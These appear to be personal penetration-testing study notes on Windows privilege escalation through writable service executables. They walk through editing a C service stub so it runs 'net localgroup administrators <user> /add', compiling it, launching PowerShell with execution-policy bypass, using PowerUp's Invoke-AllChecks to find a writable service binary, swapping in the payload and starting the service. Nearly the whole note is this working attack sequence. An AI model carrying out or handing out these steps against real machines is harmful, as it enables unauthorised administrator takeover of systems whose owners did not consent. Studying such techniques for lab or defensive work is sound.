---
title: Executable Files
updated: 2023-10-10 11:05:39Z
created: 2023-10-03 02:12:13Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# Executable Files
Pre-requisite:
Open **windows_service.c** and replace the command used by the system() function to: `cmd.exe /k net localgroup administrators <user> /add`
Compile to **file.exe**:
`x86_64-w64-mingw32-gcc windows_service.c -o file.exe`

## PowerUp.ps1
1. Open PowerShell
`cmd> powershell -ep bypass`
2. Import PowerUp module
`. ./PowerUp.ps1`
3. Run `Invoke-AllChecks`
4. Checking service executable and argument permissions...and find the **ServiceName** and the File location
5. Replace file with writable permissions (eg **vul_file.exe**) with compiled **file.exe**
6. `sc start <ServiceName>`


